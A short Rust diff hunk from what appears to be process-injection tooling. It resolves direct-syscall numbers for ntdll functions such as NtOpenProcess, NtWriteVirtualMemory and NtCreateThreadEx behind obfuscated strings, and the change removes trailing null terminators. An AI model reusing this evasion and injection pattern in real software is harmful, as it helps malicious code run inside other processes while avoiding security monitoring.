@@ -268,15 +268,15 @@ macro_rules! set_nt_ssn {
 pub static mut NT_SSN: [NtSsn; NT_FUNCTION_COUNT] = [NtSsn { ssn: 0, syscall_ret: std::ptr::null_mut(), }; NT_FUNCTION_COUNT];
 
 pub fn init_nt_api() -> Result<(), anyhow::Error>{
-    let obfused_ntdll = obfuse!("ntdll.dll\0");
+    let obfused_ntdll = obfuse!("ntdll.dll");
     let ntdll_str = obfused_ntdll.as_str();
 
-    let obfused_zw_get_context_thread = obfuse!("ZwGetContextThread\0");
-    let obfused_zw_set_context_thread = obfuse!("ZwSetContextThread\0");
-    let obfused_nt_open_process = obfuse!("NtOpenProcess\0");
-    let obfused_nt_allocate_virtual_memory = obfuse!("NtAllocateVirtualMemory\0");
-    let obfused_nt_write_virtual_memory = obfuse!("NtWriteVirtualMemory\0");
-    let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx\0");
+    let obfused_zw_get_context_thread = obfuse!("ZwGetContextThread");
+    let obfused_zw_set_context_thread = obfuse!("ZwSetContextThread");
+    let obfused_nt_open_process = obfuse!("NtOpenProcess");
+    let obfused_nt_allocate_virtual_memory = obfuse!("NtAllocateVirtualMemory");
+    let obfused_nt_write_virtual_memory = obfuse!("NtWriteVirtualMemory");
+    let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx");
 
     let str_nt_open_process = obfused_nt_open_process.as_str();
     let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
